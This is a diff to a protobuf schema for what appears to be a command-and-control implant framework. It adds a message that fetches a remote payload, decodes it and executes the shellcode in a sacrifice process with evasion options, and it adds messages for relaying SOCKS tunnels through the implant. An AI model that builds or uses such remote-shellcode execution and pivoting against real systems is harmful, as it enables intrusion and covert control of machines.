@@ -262,6 +262,18 @@ message ExecuteCommand {
   SacrificeProcess sacrifice = 2;
 }
 
+// Fetch a Mutate-format payload from a remote URL, decode it (plain/sealed
+// MLFCMUT1/MLFCMUT2 envelope, or raw), and execute the resulting shellcode.
+message MutateExecRequest {
+  string url = 1;                     // remote Mutate URL (must be http://)
+  bytes secret = 2;                   // sealed envelope secret; empty => plain/raw payload
+  string type = 3;                    // loader type: "inline_rx" | "inline_rwx"
+  string process_name = 4;            // sacrifice process name (for spawned sacrifice)
+  repeated string args = 5;           // sacrifice command-line arguments
+  bool output = 6;                    // capture execution output
+  SacrificeProcess sacrifice = 7;     // sacrifice configuration (ppid + block_dll + ...)
+}
+
 message UploadRequest {
   string name = 1;
   string target = 2;
@@ -707,4 +719,53 @@ message AutostartEntry {
 
 message AutostartsResponse {
   repeated AutostartEntry entries = 1;
+}
+
+// ---- native tunnel / socks relay (no REM) ----
+// host in TunnelOpen is raw from SOCKS CONNECT (IP literal or domain).
+// Control plane MUST NOT pre-resolve; implant resolves domains itself.
+
+message TunnelOpen {
+  uint32 conn_id = 1;
+  string host = 2;
+  uint32 port = 3;
+  uint32 timeout_ms = 4;
+}
+
+message TunnelOpenResult {
+  uint32 conn_id = 1;
+  bool success = 2;
+  string error = 3;
+  string local_addr = 4;
+  string remote_addr = 5;
+}
+
+message TunnelData {
+  uint32 conn_id = 1;
+  uint32 seq = 2;
+  bytes data = 3;
+  bool fin = 4;
+}
+
+message TunnelClose {
+  uint32 conn_id = 1;
+  string reason = 2;
+}
+
+message TunnelCtrl {
+  enum Action {
+    ACTION_UNSPECIFIED = 0;
+    START = 1;
+    STOP = 2;
+    LIST = 3;
+  }
+  Action action = 1;
+  uint32 max_conns = 2;
+  uint32 read_buf = 3;
+  uint32 max_pending_bytes = 4;
+}
+
+message TunnelListResponse {
+  repeated uint32 conn_ids = 1;
+  uint32 count = 2;
 }
